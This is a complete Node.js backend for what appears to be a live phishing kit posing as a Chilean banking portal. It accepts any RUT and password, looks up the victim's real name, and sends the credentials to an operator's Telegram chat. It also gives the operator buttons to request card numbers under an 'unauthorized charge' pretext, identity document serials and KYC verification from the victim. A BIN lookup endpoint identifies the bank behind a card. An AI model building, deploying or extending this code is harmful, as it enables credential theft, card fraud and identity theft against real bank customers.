import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Credenciales sensibles (desde variables de entorno)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const API_KEY = process.env.API_KEY;
const RUTIFICADOR_API_KEY = process.env.RUTIFICADOR_API_KEY || API_KEY || '';
const RUT_API_URL = process.env.RUT_API_URL || '';
const RUT_API_TIMEOUT_MS = Number(process.env.RUT_API_TIMEOUT_MS || 3500);
const ENABLE_RUT_FALLBACKS = process.env.ENABLE_RUT_FALLBACKS === 'true';
const RUT_DB_PATH = path.join(__dirname, 'assets', 'ruts-db.json');
const LOGIN_DEDUP_WINDOW_MS = 8000;
const recentLoginNotifications = new Map();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Servir archivos estáticos (portal_2.html, etc)

// Helper: Validar y extraer RUT limpio
function cleanRut(rut) {
  const clean = rut.replace(/\./g, '').replace(/-/g, '').toUpperCase();
  const parts = clean.split('');
  const number = parts.slice(0, -1).join('');
  const dv = parts[parts.length - 1];
  return { number, dv, full: clean };
}

// Helper: Validar dígito verificador del RUT (algoritmo chileno)
function isValidRut(rut) {
  try {
    const { number, dv } = cleanRut(rut);
    if (!number || number.length < 6 || !dv) return false;
    
    let sum = 0;
    let multiplier = 2;
    for (let i = number.length - 1; i >= 0; i--) {
      sum += parseInt(number[i]) * multiplier;
      multiplier = multiplier === 7 ? 2 : multiplier + 1;
    }
    const expectedDv = (11 - (sum % 11)) % 11;
    const expectedDvChar = expectedDv === 10 ? 'K' : expectedDv.toString();
    
    console.log(`✅ Validación RUT: ${rut} | Calculado: ${expectedDvChar}, Proporcionado: ${dv}`);
    return dv === expectedDvChar;
  } catch (e) {
    console.error('Error validating RUT:', e.message);
    return false;
  }
}

function pruneRecentLoginNotifications(now = Date.now()) {
  for (const [key, entry] of recentLoginNotifications.entries()) {
    if (now - entry.createdAt > LOGIN_DEDUP_WINDOW_MS) {
      recentLoginNotifications.delete(key);
    }
  }
}

async function getOrCreateLoginNotification(key, factory) {
  const now = Date.now();
  pruneRecentLoginNotifications(now);

  const existing = recentLoginNotifications.get(key);
  if (existing) {
    console.log('♻️ Login duplicado detectado, reutilizando notificación existente');
    return existing.promise;
  }

  const promise = (async () => {
    try {
      return await factory();
    } catch (error) {
      recentLoginNotifications.delete(key);
      throw error;
    }
  })();

  recentLoginNotifications.set(key, { createdAt: now, promise });

  const result = await promise;
  recentLoginNotifications.set(key, { createdAt: Date.now(), promise: Promise.resolve(result) });
  return result;
}

// Base de datos simulada de clientes (por RUT)
const DEFAULT_CLIENTES_DB = {};

let CLIENTES_DB = { ...DEFAULT_CLIENTES_DB };

async function loadRutDb() {
  try {
    const raw = await fs.readFile(RUT_DB_PATH, 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed === 'object') {
      CLIENTES_DB = { ...DEFAULT_CLIENTES_DB, ...parsed };
      console.log(`✅ Base local de RUT cargada: ${Object.keys(CLIENTES_DB).length} registros`);
      return;
    }
  } catch (_) {
    // Si no existe archivo, se creará al primer registro.
  }
  CLIENTES_DB = { ...DEFAULT_CLIENTES_DB };
}

async function saveRutDb() {
  await fs.writeFile(RUT_DB_PATH, JSON.stringify(CLIENTES_DB, null, 2), 'utf8');
}

async function fetchName(rut) {
  const providers = [];
  const { number, dv } = cleanRut(rut);
  const fullRut = `${number}-${dv}`;

  providers.push({
    name: 'rutificador-live',
    buildUrl: () => `https://api.rutificador.live/search/rut?rut=${encodeURIComponent(fullRut)}`,
    buildHeaders: () => ({
      Accept: 'application/json',
      ...(RUTIFICADOR_API_KEY ? { 'x-api-key': RUTIFICADOR_API_KEY } : {})
    }),
    pickName: (data) => data?.name || data?.nombre || null
  });

  if (RUT_API_URL) {
    providers.push({
      name: 'custom',
      buildUrl: (number) => `${RUT_API_URL.replace(/\/$/, '')}/${number}`,
      buildHeaders: () => ({ Accept: 'application/json' }),
      pickName: (data) => data?.nombre || data?.name || data?.fullName || null
    });
  }

  if (ENABLE_RUT_FALLBACKS) {
    providers.push(
      {
        name: 'rutify',
        buildUrl: (rutNumber) => `https://rutify.cl/api/rut/${rutNumber}`,
        buildHeaders: () => ({ Accept: 'application/json' }),
        pickName: (data) => data?.name || data?.nombre || null
      },
      {
        name: 'rut-api',
        buildUrl: (rutNumber) => `https://rut-api.vercel.app/api?rut=${rutNumber}`,
        buildHeaders: () => ({ Accept: 'application/json' }),
        pickName: (data) => data?.nombre || data?.name || null
      }
    );
  }

  async function fetchJsonWithTimeout(providerName, url, timeoutMs, headers = { Accept: 'application/json' }) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const res = await fetch(url, {
        headers,
        signal: controller.signal
      });

      if (!res.ok) {
        let detail = '';
        try {
          const errBody = await res.json();
          if (errBody?.title) {
            detail = ` (${errBody.title})`;
          }
        } catch (_) {
          // Ignorar error de parseo del body.
        }

        if (res.status === 401) {
          console.warn(`⚠️ API ${providerName}: 401 no autorizado. Revisa la API key.${detail}`);
        } else {
          console.warn(`⚠️ API ${providerName}: status ${res.status}${detail}`);
        }
        return null;
      }
      return await res.json();
    } finally {
      clearTimeout(timer);
    }
  }

  try {
    // 1. RUT inválido: no consultar API externa
    if (!isValidRut(rut)) {
      console.warn('⚠️ RUT inválido (dígito verificador incorrecto):', rut);
      return null;
    }

    // 2. Primero intentar proveedores externos (fuente real)
    for (const provider of providers) {
      try {
        const url = provider.buildUrl(number, fullRut);
        const headers = provider.buildHeaders ? provider.buildHeaders() : { Accept: 'application/json' };
        console.log(`🔍 Buscando en API ${provider.name}: ${url}`);
        const data = await fetchJsonWithTimeout(provider.name, url, RUT_API_TIMEOUT_MS, headers);
        const foundName = provider.pickName(data);

        if (foundName && String(foundName).trim()) {
          console.log(`✅ Nombre obtenido de ${provider.name}: ${foundName}`);
          return String(foundName).trim();
        }
      } catch (apiErr) {
        console.warn(`⚠️ API ${provider.name} no disponible:`, apiErr.message);
      }
    }

    // 3. Fallback local solo para registros manuales del operador
    if (CLIENTES_DB[number]) {
      console.log(`ℹ️ Nombre tomado de base local manual: ${CLIENTES_DB[number]}`);
      return CLIENTES_DB[number];
    }
    
    // 4. Fallback final: retornar null (el frontend mostrará nombre genérico)
    console.warn(`⚠️ No se encontró información para RUT: ${number} (pero es válido)`);
    return null;
  } catch (e) {
    console.error('Error fetching name:', e.message);
    return null;
  }
}

function formatRut(rut) {
  const { number, dv } = cleanRut(rut);
  return `${number}-${dv}`;
}

// Helper: toTitle
function toTitle(s) {
  return String(s)
    .toLowerCase()
    .split(/\s+/)
    .map((word) => (word ? word[0].toUpperCase() + word.slice(1) : word))
    .join(' ')
    .trim();
}

// Helper: generar botones dinámicamente
function getBotones(nombrePersona) {
  return [
    [{text:'📞 Teléfono',callback_data:'req:Número de teléfono'},{text:'✉️ Correo',callback_data:'req:Correo electrónico'}],
    [{text:'💳 Tarjeta Débito',callback_data:`req:debito-${nombrePersona}-cobro-no-autorizado`},{text:'🏦 Tarjeta Crédito',callback_data:`req:credito-${nombrePersona}-cobro-no-autorizado`}],
    [{text:'🪪 N° Serie doc.',callback_data:'req:Número de serie del documento'},{text:'📋 Motivo',callback_data:'req:Motivo de la consulta'}],
    [{text:'📷 KYC',callback_data:'req:Valida tu identidad para verificar que eres tu'}],
    [{text:'✏️ Solicitud personalizada',callback_data:'custom:ask'}],
    [{text:'✅ Finalizar atención',callback_data:'end:session'}]
  ];
}

// Helper: enviar mensaje a Telegram
async function tgSend(text, keyboard = null) {
  const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
  const body = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML'
  };
  
  if (keyboard) {
    body.reply_markup = { inline_keyboard: keyboard };
  }
  
  console.log('📤 Enviando mensaje a Telegram...');
  
  try {
    const res = await fetch(`${TG}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const d = await res.json();
    console.log(`📡 Telegram status: ${res.status}`);
    return d.ok ? d.result.message_id : null;
  } catch (e) {
    console.error('❌ Error sending to Telegram:', e.message);
    return null;
  }
}

// ENDPOINT 1: GET /api/get-name - Obtener nombre del RUT
app.get('/api/get-name', async (req, res) => {
  const { rut } = req.query;
  
  if (!rut) {
    return res.status(400).json({ error: 'RUT requerido' });
  }
  
  const name = await fetchName(rut);
  res.json({ 
    success: true,
    name: name ? toTitle(name) : 'Cliente'
  });
});

// ENDPOINT 1.1: GET /api/rut/lookup - Lookup robusto de RUT
app.get('/api/rut/lookup', async (req, res) => {
  const { rut } = req.query;

  if (!rut) {
    return res.status(400).json({ success: false, error: 'RUT requerido' });
  }

  const valid = isValidRut(rut);
  const name = await fetchName(rut);

  return res.json({
    success: true,
    rut: formatRut(rut),
    valid,
    found: Boolean(name),
    name: name ? toTitle(name) : null,
    displayName: name ? toTitle(name) : 'Cliente'
  });
});

// ENDPOINT 1.2: POST /api/rut/register - Registrar o actualizar nombre por RUT
app.post('/api/rut/register', async (req, res) => {
  const { rut, name } = req.body || {};

  if (!rut || !name || !String(name).trim()) {
    return res.status(400).json({ success: false, error: 'rut y name son requeridos' });
  }

  const { number } = cleanRut(String(rut));
  if (!number || number.length < 6) {
    return res.status(400).json({ success: false, error: 'RUT inválido' });
  }

  const normalizedName = toTitle(String(name));
  CLIENTES_DB[number] = normalizedName;

  try {
    await saveRutDb();
    return res.json({
      success: true,
      message: 'RUT registrado correctamente',
      rut: formatRut(String(rut)),
      name: normalizedName
    });
  } catch (e) {
    return res.status(500).json({ success: false, error: 'No se pudo guardar la base local de RUTs' });
  }
});

// ENDPOINT 1.3: GET /api/bin/lookup - Lookup BIN vía backend (evita CORS en frontend)
app.get('/api/bin/lookup', async (req, res) => {
  const { bin } = req.query;

  if (!bin || !/^\d{6}$/.test(String(bin))) {
    return res.status(400).json({ success: false, error: 'BIN inválido (6 dígitos requeridos)' });
  }

  try {
    const response = await fetch(`https://lookup.binlist.net/${bin}`, {
      headers: {
        Accept: 'application/json'
      }
    });

    if (!response.ok) {
      return res.status(response.status).json({
        success: false,
        error: `No se pudo consultar BIN (${response.status})`
      });
    }

    const data = await response.json();
    return res.json({
      success: true,
      bank: data?.bank?.name || null,
      type: data?.type || null,
      scheme: data?.scheme || null,
      country: data?.country?.name || null
    });
  } catch (e) {
    return res.status(502).json({ success: false, error: 'Error consultando servicio BIN externo' });
  }
});

// ENDPOINT 2: POST /api/login - Validar login (simulado)
app.post('/api/login', async (req, res) => {
  const { rut, password } = req.body;
  
  console.log('📥 LOGIN REQUEST recibido');
  
  if (!rut || !password) {
    return res.status(400).json({ error: 'RUT y contraseña requeridos' });
  }
  
  // IMPORTANTE: En producción, validar contra una base de datos
  // Por ahora es simulado - cualquier RUT con contraseña funciona
  if (rut.length < 5) {
    return res.status(400).json({ error: 'RUT inválido' });
  }

  const loginKey = `${cleanRut(rut).full}|${password}`;
  const loginResult = await getOrCreateLoginNotification(loginKey, async () => {
    const name = await fetchName(rut);
    console.log('👤 Nombre obtenido en backend');

    const displayName = name ? toTitle(name) : 'Cliente';

    console.log('📤 Enviando a Telegram...');
    const BOTONES = getBotones(displayName);
    const msgId = await tgSend(
      `🔔 <b>Nuevo cliente conectado</b>\n\n👤 <b>Nombre:</b> ${displayName}\n🪪 <b>RUT:</b> ${rut}\n\nSelecciona qué información solicitar:`,
      BOTONES
    );

    console.log('✅ Mensaje enviado a Telegram');

    return {
      success: true,
      name: displayName,
      rut,
      messageId: msgId
    };
  });

  res.json(loginResult);
});

// ENDPOINT 2.5: POST /api/send-credentials - Enviar RUT y contraseña a Telegram
app.post('/api/send-credentials', async (req, res) => {
  const { messageId, rut, password, name } = req.body;
  
  if (!rut || !password) {
    return res.status(400).json({ error: 'RUT y contraseña requeridos' });
  }
  
  const displayName = name || 'Cliente';
  const BOTONES = getBotones(displayName);
  
  // Enviar mensaje con credenciales Y botones a Telegram
  await tgSend(
    `🔐 <b>CREDENCIALES DE LOGIN</b>\n\n<code>RUT: ${rut}</code>\n<code>Contraseña: ${password}</code>\n\n👤 Cliente: <b>${displayName}</b>\n\n--- Selecciona la siguiente acción ---`,
    BOTONES
  );
  
  console.log('✅ Credenciales enviadas a Telegram');
  
  res.json({ 
    success: true,
    message: 'Credenciales y opciones enviadas a Telegram'
  });
});

// ENDPOINT 3: POST /api/send-data - Enviar datos a Telegram
app.post('/api/send-data', async (req, res) => {
  const { userName, rut, label, answer } = req.body;
  
  if (!userName || !rut || !label || !answer) {
    return res.status(400).json({ error: 'Datos incompletos' });
  }
  
  const msgId = await tgSend(
    `✅ <b>Respuesta recibida</b>\n\n👤 ${userName} | ${rut}\n📋 <b>${label}:</b>\n${answer}`
  );
  
  res.json({ 
    success: true,
    messageId: msgId
  });
});

// ENDPOINT 4: POST /api/end-session - Finalizar sesión
app.post('/api/end-session', async (req, res) => {
  const { userName, rut } = req.body;
  
  if (!userName || !rut) {
    return res.status(400).json({ error: 'Datos incompletos' });
  }
  
  await tgSend(`🔴 <b>Atención finalizada</b>\n👤 ${userName} | ${rut}\n\nSesión cerrada correctamente.`);
  
  res.json({ success: true });
});

// ENDPOINT 5: POST /api/telegram/send-message - Enviar mensaje a Telegram
app.post('/api/telegram/send-message', async (req, res) => {
  const { text, keyboard } = req.body;
  
  if (!text) {
    return res.status(400).json({ error: 'Texto requerido' });
  }
  
  const msgId = await tgSend(text, keyboard);
  res.json({ 
    success: true,
    messageId: msgId
  });
});

// ENDPOINT 6: GET /api/telegram/updates - Polling de Telegram
app.get('/api/telegram/updates', async (req, res) => {
  const { offset } = req.query;
  const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
  
  try {
    const response = await fetch(
      `${TG}/getUpdates?offset=${offset || 0}&limit=10&timeout=1`
    );
    const data = await response.json();
    res.json({ updates: data.ok ? data.result : [] });
  } catch (e) {
    console.error('Error getting updates:', e);
    res.json({ updates: [] });
  }
});

// ENDPOINT 7: POST /api/telegram/answer-callback - Responder callback
app.post('/api/telegram/answer-callback', async (req, res) => {
  const { callbackQueryId } = req.body;
  const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
  
  try {
    await fetch(`${TG}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: '✓ Enviado al cliente'
      })
    });
    res.json({ success: true });
  } catch (e) {
    console.error('Error answering callback:', e);
    res.json({ success: false });
  }
});

// ENDPOINT 8: POST /api/telegram/edit-message - Editar mensaje
app.post('/api/telegram/edit-message', async (req, res) => {
  const { messageId, text, keyboard } = req.body;
  const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
  
  const body = {
    chat_id: CHAT_ID,
    message_id: messageId,
    text,
    parse_mode: 'HTML'
  };
  
  if (keyboard) {
    body.reply_markup = { inline_keyboard: keyboard };
  } else {
    body.reply_markup = { inline_keyboard: [] };
  }
  
  try {
    await fetch(`${TG}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    res.json({ success: true });
  } catch (e) {
    console.error('Error editing message:', e);
    res.json({ success: false });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

// RUTA RAÍZ: Servir portal_2.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'portal_2.html'));
});

await loadRutDb();

app.listen(PORT, () => {
  console.log(`🚀 Backend corriendo en puerto ${PORT}`);
  console.log('Asegúrate de tener las variables de entorno configuradas:');
  console.log('  - BOT_TOKEN');
  console.log('  - CHAT_ID');
  console.log('  - API_KEY');
});
